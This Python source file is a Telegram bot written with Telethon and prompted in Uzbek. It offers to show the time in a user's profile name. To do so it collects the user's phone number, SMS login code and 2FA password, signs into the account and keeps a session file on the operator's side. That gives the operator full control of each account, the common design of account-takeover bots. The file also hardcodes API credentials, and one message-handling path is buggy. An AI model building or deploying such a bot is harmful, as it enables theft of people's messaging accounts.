from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.custom import Button
from telethon.tl.functions.account import UpdateProfileRequest
from datetime import datetime
import asyncio

API_ID = 10953300
API_HASH = "9c24426e5d6fa1d441913e3906627f87"
BOT_TOKEN = "bot token joylanadi"

user_sessions = {}
clock_active = False

async def start_client(phone):
    client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
    await client.connect()
    return client

async def handle_start_message(event):
    await event.reply("Telefon raqamingizni yuboring: (+998912116939)\nMisol: +998901234567")

async def handle_phone(event):
    phone = event.text
    if phone.startswith("+") and phone[1:].isdigit():
        client = await start_client(phone)
        try:
            await asyncio.sleep(1)  
            await client.send_code_request(phone)
            user_sessions[event.sender_id] = {
                'client': client,
                'phone': phone,
                'code': '',
                'awaiting_password': False,
                'message': await event.reply(
                    "SMS kodni kiriting (Inline tugmalar yordamida):",
                    buttons=[
                        [Button.inline('1', 'code_1'), Button.inline('2', 'code_2'), Button.inline('3', 'code_3')],
                        [Button.inline('4', 'code_4'), Button.inline('5', 'code_5'), Button.inline('6', 'code_6')],
                        [Button.inline('7', 'code_7'), Button.inline('8', 'code_8'), Button.inline('9', 'code_9')],
                        [Button.inline('Clear', 'code_clear'), Button.inline('0', 'code_0')]
                    ]
                )
            }
        except Exception as e:
            await event.reply(f"Xato yuz berdi: {str(e)}")

async def handle_code_input(event):
    user_data = user_sessions.get(event.sender_id)
    if not user_data:
        await event.reply("Avval telefon raqamingizni yuboring.")
        return

    client = user_data['client']
    phone = user_data['phone']

    data = event.data.decode('utf-8')
    code_input = data.split("_")[1]
    if code_input == "clear":
        user_data['code'] = ""
        await user_data['message'].edit("Kod tozalandi. Yangi kodni kiriting:")
        return
    else:
        user_data['code'] += code_input

    if len(user_data['code']) >= 5:
        try:
            await client.sign_in(phone, user_data['code'])
            await event.reply("Agar 2FA parolingiz bo'lsa, uni yozing:")
            user_data['awaiting_password'] = True
        except SessionPasswordNeededError:
            user_data['awaiting_password'] = True
            await event.reply("2FA parolingizni yuboring:")
        except Exception as e:
            await event.reply(f"Kod noto'g'ri yoki xato yuz berdi: {str(e)}")
    else:
        await user_data['message'].edit(f"Joriy kod: {user_data['code']}\nKodning qolgan qismini kiriting")

async def handle_password(event):
    user_data = user_sessions.get(event.sender_id)
    if not user_data or not user_data.get('awaiting_password'):
        await event.reply("Avval kodni to'g'ri kiriting.")
        return

    client = user_data['client']
    try:
        await client.sign_in(password=event.text)
        await event.reply("Account muvaffaqiyatli ulandi!")
        await event.reply("Soat muvaffaqiyatli o'rnatildi.")
        await set_clock(client)
    except Exception as e:
        await event.reply(f"Xato yuz berdi: {str(e)}")

async def set_clock(client):
    global clock_active
    clock_active = True
    while clock_active:
        now = datetime.now()
        current_time = now.strftime("%H:%M")
        try:
            await client(UpdateProfileRequest(last_name=str(current_time)))
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)  
        await asyncio.sleep(60)  

async def safe_send_message(client, event, message):
    try:
        await event.reply(message)
    except FloodWaitError as e:
        print(f"Flood wait xatosi yuz berdi: {e.seconds} soniya kutish kerak")
        await asyncio.sleep(e.seconds)  
        await event.reply(message)

async def main():
    bot = TelegramClient('bot', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)

    @bot.on(events.NewMessage(pattern='/start'))
    async def on_start(event):
        await handle_start_message(event)

    @bot.on(events.NewMessage)
    async def on_message(event):
        user_data = user_sessions.get(event.sender_id)

        if user_data and not user_data['awaiting_password']:
            await handle_code_input(event)
        elif user_data and user_data['awaiting_password']:
            await handle_password(event)
        elif not user_data:
            await handle_phone(event)

    @bot.on(events.CallbackQuery)
    async def on_callback_query(event):
        data = event.data.decode('utf-8')
        if data.startswith("code_"):
            await handle_code_input(event)

    await bot.run_until_disconnected()

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
